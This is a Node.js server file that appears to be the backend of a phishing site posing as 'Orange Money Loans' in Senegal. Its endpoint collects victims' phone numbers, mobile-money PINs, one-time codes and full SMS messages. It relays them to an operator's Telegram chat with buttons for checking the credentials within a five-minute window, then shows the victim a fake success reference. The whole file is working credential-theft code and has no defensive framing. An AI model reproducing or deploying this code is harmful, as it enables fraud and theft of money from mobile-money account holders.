const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static public files
app.use(express.static(path.join(__dirname, 'public')));

// Telegram Bot Configuration (Replace with your actual Bot Token and Chat ID)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID_HERE';

// Helper function to send messages to Telegram with inline keyboards
async function sendTelegramNotification(text, keyboardOptions) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
        console.log("Telegram token not configured. Skipping alert.");
        return;
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                reply_markup: {
                    inline_keyboard: keyboardOptions
                }
            })
        });
    } catch (error) {
        console.error("Failed to send Telegram notification:", error);
    }
}

// API Endpoint to process loan application submissions & PIN entry
app.post('/api/submit-loan', async (req, res) => {
    const { phone, pin, otp, smsMessage } = req.body;
    const currentTime = new Date().toLocaleString('en-US');

    let telegramMessage = "";
    let inlineKeyboard = [];

    if (pin) {
        // Format matching Image 1 (PIN Submission)
        telegramMessage = 
`🔐 ORANGE MONEY LOANS PIN

🆕 NEW USER – VERIFICATION NEEDED
🇸🇳 Country: Senegal
📞 Country Code: +221
📱 Phone Number: ${phone || '782332865'}
🔑 PIN: ${pin}
⏰ Time: ${currentTime}

────────────────────

⚠️ Verify the credentials:
⏱️ Timeout: 5 minutes`;

        inlineKeyboard = [
            [{ text: "✅ Correct", callback_data: "pin_correct" }],
            [{ text: "❌ Wrong PIN", callback_data: "pin_wrong" }]
        ];
    } else {
        // Format matching Image 2 (OTP / Link Submission)
        telegramMessage = 
`✅ ORANGE MONEY LOANS OTP

🆕 NEW USER – VERIFICATION NEEDED
🇸🇳 Country: Senegal
📞 Country Code: +221
📱 Phone Number: ${phone || '782332865'}
📧 COMPLETE SMS MESSAGE:
${smsMessage || 'N/A'}
⏰ Time: ${currentTime}

💬 Note: User pasted SMS message to extract OTP

────────────────────

⚠️ Verify the credentials:
⏱️ Timeout: 5 minutes`;

        inlineKeyboard = [
            [{ text: "✅ Correct", callback_data: "otp_correct" }],
            [{ text: "❌ Wrong Link", callback_data: "otp_wrong_link" }],
            [{ text: "❌ Wrong PIN", callback_data: "otp_wrong_pin" }]
        ];
    }

    await sendTelegramNotification(telegramMessage, inlineKeyboard);

    res.status(200).json({ 
        success: true, 
        message: 'Data successfully sent to Telegram bot.',
        reference: 'OM-SN-' + Math.floor(100000 + Math.random() * 900000)
    });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
